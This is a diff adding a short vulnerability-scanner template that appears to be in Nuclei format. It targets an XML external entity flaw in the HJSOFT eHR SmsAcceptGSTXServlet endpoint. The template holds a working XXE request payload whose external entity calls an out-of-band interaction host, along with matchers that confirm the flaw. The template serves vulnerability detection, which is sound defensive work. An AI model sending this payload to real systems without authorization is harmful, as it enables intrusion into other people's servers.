@@ -1,0 +1,34 @@
+id: hjsoft-ehr-servlet-xxe
+info:
+  name: HJSOFT eHR XXE in SmsAcceptGSTXServlet
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, xxe
+  description: |
+    HJSOFT eHR system /servlet/sms/SmsAcceptGSTXServlet is vulnerable to XML External Entity injection, allowing attackers to trigger DNS-based out-of-band interactions.
+
+variables:
+  reverse_dns: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /servlet/sms/SmsAcceptGSTXServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "http://{{reverse_dns}}">]><r><a>&sp;</a></r>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ZWTSMSMessage"
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
